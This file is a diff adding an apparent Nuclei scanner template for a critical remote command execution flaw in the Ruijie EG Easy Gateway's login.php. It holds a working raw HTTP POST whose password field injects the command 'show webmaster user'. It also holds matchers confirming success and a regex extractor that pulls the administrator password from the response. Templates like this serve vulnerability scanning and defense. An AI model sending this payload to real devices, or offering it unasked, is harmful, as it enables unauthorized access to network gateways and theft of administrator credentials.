@@ -1,0 +1,53 @@
+id: ruijie-eg-login-rce
+
+info:
+  name: Ruijie EG Easy Gateway - Remote Command Execution
+  author: pikpikcu,pdteam
+  severity: critical
+  description: Ruijie EG Easy Gateway login.php has remote commmand execution vulnerability, which can lead to the disclosure of administrator account and password.
+  reference:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
+    - https://www.ruijienetworks.com
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: ruijie,rce
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?show+webmaster+user
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"data":'
+          - '"status":1'
+          - 'admin'
+        condition: and
+        part: body
+
+      - type: word
+        words:
+          - 'text/json'
+        part: header
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - 'admin ([a-zA-Z0-9#@]+)",'
+
+# digest: 490a0046304402200c22956319907b482df2e1ecead3de34b7b79037f88fa25f29907b4e57245f64022028cde76a58b93c0521e1c2684949d41384ac660c08fed06b9d4cfeae4dab1493:922c64590222798bb761d5b6d8e72950
